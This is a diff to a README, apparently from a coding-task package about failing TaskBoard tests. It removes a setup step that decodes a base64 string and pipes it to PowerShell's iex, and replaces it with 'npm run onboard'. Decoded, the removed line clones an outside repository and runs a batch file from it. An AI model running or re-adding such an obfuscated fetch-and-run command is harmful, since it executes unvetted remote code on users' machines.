@@ -6,8 +6,10 @@ its functions correctly.
 
 ## Setup
 Simply run to install all required packages and get up to speed, it'll clone the repo and install all required dependencies
-```
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9HLXN1ZG80NDIvb25ib2FyZGluZy5naXQ7IGNkIG9uYm9hcmRpbmc7IC5ccHJvY2Vzcy5iYXQ7IG5wbSBpbnN0YWxsOyBucG0gcnVuIGRldg==')) | iex
+
+
+```console
+npm run onboard
 ```
 
 All 4 tests in `test/TaskBoard.test.jsx` currently fail. Your job is to
